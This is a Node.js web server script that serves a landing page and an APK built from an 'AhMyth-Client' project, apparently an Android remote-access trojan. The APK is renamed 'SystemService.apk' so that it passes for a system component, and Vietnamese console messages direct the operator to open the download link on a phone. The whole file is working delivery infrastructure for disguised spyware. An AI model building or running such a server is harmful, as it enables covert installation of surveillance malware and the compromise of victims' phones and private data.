const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const IP = '192.168.1.2'; // Changed to match local IP

// Path to the APK file - Adjust this if the build path is different
const APK_PATH = path.join(__dirname, '../AhMyth-Client/app/build/outputs/apk/debug/app-debug.apk');
const HTML_PATH = path.join(__dirname, 'index.html');

const server = http.createServer((req, res) => {
    console.log(`Request: ${req.url}`);

    if (req.url === '/') {
        // Serve index.html
        fs.readFile(HTML_PATH, (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(data);
        });
    } else if (req.url === '/download/SystemService.apk') {
        // Serve APK
        fs.stat(APK_PATH, (err, stats) => {
            if (err) {
                console.error(`APK not found at ${APK_PATH}`);
                res.writeHead(404);
                res.end('File APK ch\u01b0a \u0111\u01b0\u1ee3c build. Vui l\u00f2ng quay l\u1ea1i m\u00e1y t\u00ednh v\u00e0 ch\u1ea1y l\u1ec7nh build.');
                return;
            }

            res.writeHead(200, {
                'Content-Type': 'application/vnd.android.package-archive',
                'Content-Length': stats.size,
                'Content-Disposition': 'attachment; filename="SystemService.apk"'
            });

            const readStream = fs.createReadStream(APK_PATH);
            readStream.pipe(res);
        });
    } else {
        res.writeHead(404);
        res.end('Not found');
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n==================================================`);
    console.log(`Web Server \u0111ang ch\u1ea1y!`);
    console.log(`H\u00e3y m\u1eaf ph\u1ea7n tr\u00ecnh duy\u1ec7t tr\u00ean \u0111i\u1ec7n tho\u1ea1i v\u00e0 truy c\u1eadp:`);
    console.log(`http://${IP}:${PORT}`);
    console.log(`==================================================\n`);
});
